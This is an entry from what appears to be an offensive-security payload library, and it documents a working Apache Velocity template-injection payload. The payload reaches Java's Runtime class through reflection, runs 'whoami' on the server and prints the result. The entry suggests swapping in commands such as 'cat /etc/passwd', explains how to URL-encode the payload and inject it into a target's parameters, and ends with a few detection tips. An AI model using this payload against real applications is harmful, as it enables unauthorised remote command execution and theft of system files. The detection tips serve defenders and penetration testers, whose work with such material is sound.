---
id: f4a4bd23-2bb2-4bc8-be66-2f345bb56780
name: Velocity-SSTI-Whoami-Payload
type: code
language: velocity
verified: true
created_at: '2023-04-06T03:56:40.379518+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Java
  - Web
tags:
  - SSTI
  - payload
  - RCE
  - Velocity
validated: true
---

# Velocity-SSTI-Whoami-Payload

## Code

```velocity
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

## Description

This Velocity Template Language (VTL) payload exploits SSTI vulnerabilities in Java applications using the Apache Velocity engine. It uses Java reflection to access the Runtime class, executes the 'whoami' command to retrieve the current server's username, waits for completion, reads the output stream, and constructs the result as a string for inclusion in the rendered template response.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| "whoami" | The system command to execute (hardcoded; modify for other commands like 'id' or 'ls') | "cat /etc/passwd" |

## Usage

Inject this payload into a vulnerable user-controlled input (e.g., query parameter, form field, or header) that is interpolated into a Velocity template. URL-encode the payload before sending via HTTP requests. For example, use it in a GET request: http://target.com/vulnerable?template=<encoded_payload>. Upon evaluation, the server will execute the command and display the output in the response, confirming RCE.

## Detection

- Monitor application logs for Velocity evaluation errors or unusual Java introspection calls (e.g., $class.inspect).
- Enable Java security managers to restrict Runtime.exec and class loading.
- WAF rules to block VTL patterns like #set, $class.inspect, or Runtime.exec in inputs.
- Process monitoring for unexpected command executions (e.g., via auditd or Sysmon) tied to web application processes.

## Related

- [[procedures/Java-Velocity-Server-Side-Template-Injection]]
- [[curl-velocity-ssti-inject]]
